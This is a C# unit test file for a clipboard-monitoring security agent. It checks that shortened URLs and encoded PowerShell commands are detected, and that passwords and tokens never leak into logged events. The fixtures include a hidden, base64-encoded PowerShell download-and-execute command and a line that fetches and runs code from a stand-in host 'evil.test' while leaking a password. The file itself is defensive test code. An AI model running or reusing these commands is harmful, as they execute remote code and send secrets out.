using Sentinel.Shared.Json;
using Sentinel.Shared.Models;
using Sentinel.Tray.Collectors;

namespace Sentinel.Agent.Tests;

public sealed class ClipboardAnalyzerTests
{
    [Fact]
    public void ShortenedUrl_ShouldProduceClipboardUrlWithShortenerFlagAndNoQueryLeak()
    {
        const string secretToken = "MonJetonUltraConfidentiel999";
        var raw = $"https://bit.ly/3xPhishLink?token={secretToken}&user=alice";

        var evt = ClipboardAnalyzer.AnalyzeToEvent(raw, "host-01", "alice");

        evt.Should().NotBeNull();
        evt!.Category.Should().Be(EventCategory.Clipboard);
        evt.EventType.Should().Be(EventTypes.ClipboardUrl);
        evt.Subject.Should().Be("bit.ly");
        evt.Attr(AttributeKeys.ContentType).Should().Be("url");
        evt.Attr(AttributeKeys.Domain).Should().Be("bit.ly");
        evt.AttrIsTrue(AttributeKeys.IsShortener).Should().BeTrue();
        evt.Attr(AttributeKeys.ContentHash).Should().NotBeNullOrWhiteSpace().And.HaveLength(64);

        var serialized = SentinelJson.Serialize(evt);
        serialized.Should().NotContain(secretToken);
        serialized.Should().NotContain("3xPhishLink");
    }

    [Fact]
    public void EncodedPowerShellCommand_ShouldProduceClipboardCommandWithoutRawPayload()
    {
        const string payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        var raw = $"powershell.exe -NoP -W Hidden -EncodedCommand {payload}";

        var evt = ClipboardAnalyzer.AnalyzeToEvent(raw, "host-01", "alice");

        evt.Should().NotBeNull();
        evt!.EventType.Should().Be(EventTypes.ClipboardCommand);
        evt.Attr(AttributeKeys.ContentType).Should().Be("command");
        evt.Attr(AttributeKeys.CommandKind).Should().Be("powershell-encoded");
        evt.Attr(AttributeKeys.ContentHash).Should().HaveLength(64);

        var serialized = SentinelJson.Serialize(evt);
        serialized.Should().NotContain(payload);
        serialized.Should().NotContain(raw);
    }

    [Fact]
    public void PrivacyGuarantee_PlainPasswordOrSensitiveSecretsMustNeverLeakIntoSecurityEvent()
    {
        const string password = "MotDePasseSuperSecret!2026#XYZ";

        // 1. Mot de passe copié seul : aucun événement ne doit être émis.
        ClipboardAnalyzer.AnalyzeToEvent(password, "host-01", "alice").Should().BeNull();
        ClipboardAnalyzer.AnalyzeToEvent($"Bonjour, voici le code : {password}", "host-01", "alice").Should().BeNull();

        // 2. Mot de passe présent dans les identifiants / paramètres d'une URL copiée : jamais exposé.
        var urlWithSecret = $"https://admin:{password}@tinyurl.com/login/{password}?pwd={password}";
        var urlEvt = ClipboardAnalyzer.AnalyzeToEvent(urlWithSecret, "host-01", "alice");
        urlEvt.Should().NotBeNull();
        var urlJson = SentinelJson.Serialize(urlEvt!);
        urlJson.Should().NotContain(password);
        urlEvt!.Subject.Should().Be("tinyurl.com");

        // 3. Mot de passe présent dans une commande PowerShell copiée : jamais exposé.
        var cmdWithSecret = $"powershell -w hidden -c \"Invoke-WebRequest https://evil.test/a?p={password} | IEX\"";
        var cmdEvt = ClipboardAnalyzer.AnalyzeToEvent(cmdWithSecret, "host-01", "alice");
        cmdEvt.Should().NotBeNull();
        var cmdJson = SentinelJson.Serialize(cmdEvt!);
        cmdJson.Should().NotContain(password);
        cmdJson.Should().NotContain("Invoke-WebRequest");
    }
}
